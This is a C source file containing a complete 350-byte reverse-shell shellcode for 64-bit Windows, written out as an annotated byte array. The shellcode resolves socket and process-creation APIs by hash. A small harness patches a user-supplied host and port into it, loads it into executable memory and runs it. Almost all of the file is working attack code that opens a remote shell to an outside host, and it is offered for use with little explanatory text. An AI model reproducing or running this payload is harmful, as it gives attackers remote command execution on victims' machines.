
#include <windows.h>
#include <winsock.h>
#include <stdio.h>

#pragma comment (lib, "ws2_32.lib")
#define in_addr_t unsigned long

//
// 350 bytes reverse shell for windows 64 using ipv4
//
// cl rev_overlap64_test.cpp
//

/* Copyright (c) 2014 Kevin Devine */
/* Size = 350 bytes */

char rev_overlap64[] = {
  /* 0000 */  "\x53"                          /*  push rbx                                 */
  /* 0001 */  "\x56"                          /*  push rsi                                 */
  /* 0002 */  "\x57"                          /*  push rdi                                 */
  /* 0003 */  "\x55"                          /*  push rbp                                 */
  /* 0004 */  "\x41\x54"                      /*  push r12                                 */
  /* 0006 */  "\x41\x55"                      /*  push r13                                 */
  /* 0008 */  "\x41\x56"                      /*  push r14                                 */
  /* 000A */  "\x41\x57"                      /*  push r15                                 */
  /* 000C */  "\x4C\x8B\xFC"                  /*  mov r15, rsp                             */
  /* 000F */  "\x48\x83\xE4\xF0"              /*  and rsp, FFFFFFFFFFFFFFF0h               */
  /* 0013 */  "\x48\x83\xEC\x28"              /*  sub rsp, 28h                             */
  /* 0017 */  "\xF9"                          /*  stc                                      */
  /* 0018 */  "\xEB\x6E"                      /*  jmp 00000088h                            */
  /* 001A */  "\x5E"                          /*  pop rsi                                  */
  /* 001B */  "\x48\x8D\x6E\x24"              /*  lea rbp, qword ptr [rsi+24h]             */
  /* 001F */  "\x33\xC0"                      /*  xor eax, eax                             */
  /* 0021 */  "\x99"                          /*  cdq                                      */
  /* 0022 */  "\xB2\xE8"                      /*  mov dl, E8h                              */
  /* 0024 */  "\x2B\xE2"                      /*  sub esp, edx                             */
  /* 0026 */  "\x8B\xCA"                      /*  mov ecx, edx                             */
  /* 0028 */  "\x48\x8B\xFC"                  /*  mov rdi, rsp                             */
  /* 002B */  "\xF3\xAA"                      /*  rep stosb                                */
  /* 002D */  "\xB8\x9C\x92\x9B\xFF"          /*  mov eax, FF9B929Ch                       */
  /* 0032 */  "\xF7\xD0"                      /*  not eax                                  */
  /* 0034 */  "\x48\x8D\x7C\x24\x50"          /*  lea rdi, qword ptr [rsp+50h]             */
  /* 0039 */  "\x4C\x8B\xE7"                  /*  mov r12, rdi                             */
  /* 003C */  "\x48\xAB"                      /*  stosq                                    */
  /* 003E */  "\x4C\x8B\xEF"                  /*  mov r13, rdi                             */
  /* 0041 */  "\x48\xAD"                      /*  lodsq                                    */
  /* 0043 */  "\x48\xF7\xD0"                  /*  not rax                                  */
  /* 0046 */  "\x48\xAB"                      /*  stosq                                    */
  /* 0048 */  "\x48\xAF"                      /*  scasq                                    */
  /* 004A */  "\x4C\x8B\xF7"                  /*  mov r14, rdi                             */
  /* 004D */  "\x6A\x68"                      /*  push 00000068h                           */
  /* 004F */  "\x58"                          /*  pop rax                                  */
  /* 0050 */  "\xAB"                          /*  stosd                                    */
  /* 0051 */  "\x41\xFF\x46\x3D"              /*  inc dword ptr [r14+3Dh]                  */
  /* 0055 */  "\x4C\x89\x74\x24\x40"          /*  mov qword ptr [rsp+40h], r14             */
  /* 005A */  "\x49\x8D\x7E\x50"              /*  lea rdi, qword ptr [r14+50h]             */
  /* 005E */  "\x4D\x33\xC9"                  /*  xor r9, r9                               */
  /* 0061 */  "\x4D\x33\xC0"                  /*  xor r8, r8                               */
  /* 0064 */  "\xB2\x01"                      /*  mov dl, 01h                              */
  /* 0066 */  "\xB1\x02"                      /*  mov cl, 02h                              */
  /* 0068 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 006A */  "\x48\xAB"                      /*  stosq                                    */
  /* 006C */  "\x48\xAB"                      /*  stosq                                    */
  /* 006E */  "\x48\xAB"                      /*  stosq                                    */
  /* 0070 */  "\x48\xAF"                      /*  scasq                                    */
  /* 0072 */  "\x93"                          /*  xchg eax, ebx                            */
  /* 0073 */  "\x48\x89\x7C\x24\x48"          /*  mov qword ptr [rsp+48h], rdi             */
  /* 0078 */  "\xFF\x44\x24\x20"              /*  inc dword ptr [rsp+20h]                  */
  /* 007C */  "\x6A\x10"                      /*  push 00000010h                           */
  /* 007E */  "\x41\x58"                      /*  pop r8                                   */
  /* 0080 */  "\x49\x8B\xD5"                  /*  mov rdx, r13                             */
  /* 0083 */  "\x8B\xCB"                      /*  mov ecx, ebx                             */
  /* 0085 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 0087 */  "\xF8"                          /*  clc                                      */
  /* 0088 */  "\x72\x33"                      /*  jc 000000BDh                             */
  /* 008A */  "\x4D\x33\xC0"                  /*  xor r8, r8                               */
  /* 008D */  "\x4D\x33\xC9"                  /*  xor r9, r9                               */
  /* 0090 */  "\x49\x8B\xD4"                  /*  mov rdx, r12                             */
  /* 0093 */  "\x91"                          /*  xchg eax, ecx                            */
  /* 0094 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 0096 */  "\x83\xCA\xFF"                  /*  or edx, FFFFFFFFh                        */
  /* 0099 */  "\x48\x8B\x0F"                  /*  mov rcx, qword ptr [rdi]                 */
  /* 009C */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 009E */  "\x48\x8B\x0F"                  /*  mov rcx, qword ptr [rdi]                 */
  /* 00A1 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00A3 */  "\x48\x8B\x4F\x08"              /*  mov rcx, qword ptr [rdi+08h]             */
  /* 00A7 */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00A9 */  "\x8B\xCB"                      /*  mov ecx, ebx                             */
  /* 00AB */  "\xFF\xD5"                      /*  call rbp                                 */
  /* 00AD */  "\x49\x8B\xE7"                  /*  mov rsp, r15                             */
  /* 00B0 */  "\x41\x5F"                      /*  pop r15                                  */
  /* 00B2 */  "\x41\x5E"                      /*  pop r14                                  */
  /* 00B4 */  "\x41\x5D"                      /*  pop r13                                  */
  /* 00B6 */  "\x41\x5C"                      /*  pop r12                                  */
  /* 00B8 */  "\x5D"                          /*  pop rbp                                  */
  /* 00B9 */  "\x5F"                          /*  pop rdi                                  */
  /* 00BA */  "\x5E"                          /*  pop rsi                                  */
  /* 00BB */  "\x5B"                          /*  pop rbx                                  */
  /* 00BC */  "\xC3"                          /*  ret                                      */
  /* 00BD */  "\xE8\x58\xFF\xFF\xFF"          /*  call 0000001Ah                           */

  /* 00C2 */  "\x00\x00\x00\x00"              /*  sockaddr_in with sin_zero field missing */
  /* 00C6 */  "\x00\x00\x00\x00"

  /* 00CA */  "\xB2\xA5\xC1\x87"              /*  WSASocketA          */
  /* 00CE */  "\xEC\x80\x9C\xE4"              /*  connect             */
  /* 00D2 */  "\xFE\xDF\x72\x17"              /*  CreateProcessA      */
  /* 00D6 */  "\x4B\xDA\x38\x53"              /*  WaitForSingleObject */
  /* 00DA */  "\x35\xC9\x1E\x7F"              /*  CloseHandle         */
  /* 00DE */  "\x35\xC9\x1E\x7F"              /*  CloseHandle         */
  /* 00E2 */  "\x6E\xED\xCD\xA2"              /*  closesocket         */
  
  /* 00E6 */  "\xAD"                          /*  lodsd                                    */
  /* 00E7 */  "\x50"                          /*  push rax                                 */
  /* 00E8 */  "\x51"                          /*  push rcx                                 */
  /* 00E9 */  "\x52"                          /*  push rdx                                 */
  /* 00EA */  "\x53"                          /*  push rbx                                 */
  /* 00EB */  "\x55"                          /*  push rbp                                 */
  /* 00EC */  "\x56"                          /*  push rsi                                 */
  /* 00ED */  "\x57"                          /*  push rdi                                 */
  /* 00EE */  "\x6A\x60"                      /*  push 00000060h                           */
  /* 00F0 */  "\x5E"                          /*  pop rsi                                  */
  /* 00F1 */  "\x65\x48\xAD"                  /*  lodsq                                    */
  /* 00F4 */  "\x48\x8B\x40\x18"              /*  mov rax, qword ptr [rax+18h]             */
  /* 00F8 */  "\x4C\x8B\x50\x30"              /*  mov r10, qword ptr [rax+30h]             */
  /* 00FC */  "\x49\x8B\x6A\x10"              /*  mov rbp, qword ptr [r10+10h]             */
  /* 0100 */  "\x4D\x8B\x12"                  /*  mov r10, qword ptr [r10]                 */
  /* 0103 */  "\x8B\x45\x3C"                  /*  mov eax, dword ptr [rbp+3Ch]             */
  /* 0106 */  "\x83\xC0\x10"                  /*  add eax, 10h                             */
  /* 0109 */  "\x8B\x44\x28\x78"              /*  mov eax, dword ptr [rax+rbp+78h]         */
  /* 010D */  "\x48\x8D\x74\x28\x18"          /*  lea rsi, qword ptr [rax+rbp+18h]         */
  /* 0112 */  "\xAD"                          /*  lodsd                                    */
  /* 0113 */  "\x91"                          /*  xchg eax, ecx                            */
  /* 0114 */  "\x67\xE3\xE5"                  /*  jecxz 000000FCh                          */
  /* 0117 */  "\xAD"                          /*  lodsd                                    */
  /* 0118 */  "\x4C\x8D\x1C\x28"              /*  lea r11, qword ptr [rax+rbp]             */
  /* 011C */  "\xAD"                          /*  lodsd                                    */
  /* 011D */  "\x48\x8D\x3C\x28"              /*  lea rdi, qword ptr [rax+rbp]             */
  /* 0121 */  "\xAD"                          /*  lodsd                                    */
  /* 0122 */  "\x48\x8D\x1C\x28"              /*  lea rbx, qword ptr [rax+rbp]             */
  /* 0126 */  "\x8B\x74\x8F\xFC"              /*  mov esi, dword ptr [rdi+rcx*4-04h]       */
  /* 012A */  "\x48\x03\xF5"                  /*  add rsi, rbp                             */
  /* 012D */  "\x33\xC0"                      /*  xor eax, eax                             */
  /* 012F */  "\x99"                          /*  cdq                                      */
  /* 0130 */  "\xAC"                          /*  lodsb                                    */
  /* 0131 */  "\x03\xD0"                      /*  add edx, eax                             */
  /* 0133 */  "\xC1\xC2\x07"                  /*  rol edx, 07h                             */
  /* 0136 */  "\x33\xD0"                      /*  xor edx, eax                             */
  /* 0138 */  "\xFF\xC8"                      /*  dec eax                                  */
  /* 013A */  "\x79\xF4"                      /*  jns 00000130h                            */
  /* 013C */  "\x48\x3B\x54\x24\x30"          /*  cmp rdx, qword ptr [rsp+30h]             */
  /* 0141 */  "\xE0\xE3"                      /*  loopne 00000126h                         */
  /* 0143 */  "\x75\xB7"                      /*  jne 000000FCh                            */
  /* 0145 */  "\x0F\xB7\x14\x4B"              /*  movzx edx, word ptr [rbx+rcx*2]          */
  /* 0149 */  "\x41\x8B\x04\x93"              /*  mov eax, dword ptr [r11+rdx*4]           */
  /* 014D */  "\x48\x03\xE8"                  /*  add rbp, rax                             */
  /* 0150 */  "\x48\x89\x6C\x24\x30"          /*  mov qword ptr [rsp+30h], rbp             */
  /* 0155 */  "\x5F"                          /*  pop rdi                                  */
  /* 0156 */  "\x5E"                          /*  pop rsi                                  */
  /* 0157 */  "\x5D"                          /*  pop rbp                                  */
  /* 0158 */  "\x5B"                          /*  pop rbx                                  */
  /* 0159 */  "\x5A"                          /*  pop rdx                                  */
  /* 015A */  "\x59"                          /*  pop rcx                                  */
  /* 015B */  "\x58"                          /*  pop rax                                  */
  /* 015C */  "\xFF\xE0"                      /*  jmp rax                                  */
};

/**********************************************************************
 *  Resolve ip or hostname
 **********************************************************************/
in_addr_t resolve (char host[]) {
  struct      hostent *hp;
  in_addr_t   host_ip = 0;

  host_ip = inet_addr (host);
  
  if (host_ip == INADDR_NONE) {
    hp = gethostbyname (host);
    if (hp != NULL) {
      host_ip = *(in_addr_t *)hp->h_addr;
    }
  }
  return host_ip;
}

int main (int argc, char* argv[]) {
  
  puts ("\nCopyright (c) 2014 Kevin Devine\n");
  
  if (argc != 3) {
    printf ("\nUsage: rev_overlap64_test <host> <port>");
    printf ("\nExample: rev_overlap64_test localhost 80\n");
    return 0;
  }
  
  // required for shellcode to run
  WSADATA wsa;
  WSAStartup (MAKEWORD(2, 0), &wsa);
  
  sockaddr_in *p = (sockaddr_in*)&rev_overlap64[0xc2];
  in_addr_t ip = ~resolve (argv[1]);
  
  memcpy (&p->sin_addr, &ip, sizeof (ip));
  p->sin_port   = ~htons (atoi(argv[2]));
  p->sin_family = ~AF_INET;
  
  void *exec = VirtualAlloc(0, strlen (rev_overlap64), 
      MEM_COMMIT, PAGE_EXECUTE_READWRITE);
  memcpy (exec, rev_overlap64, strlen (rev_overlap64));
  //DebugBreak();
  ((void(*)())exec)();
  VirtualFree (exec, 0, MEM_RELEASE);
  WSACleanup();
  return 0;
}

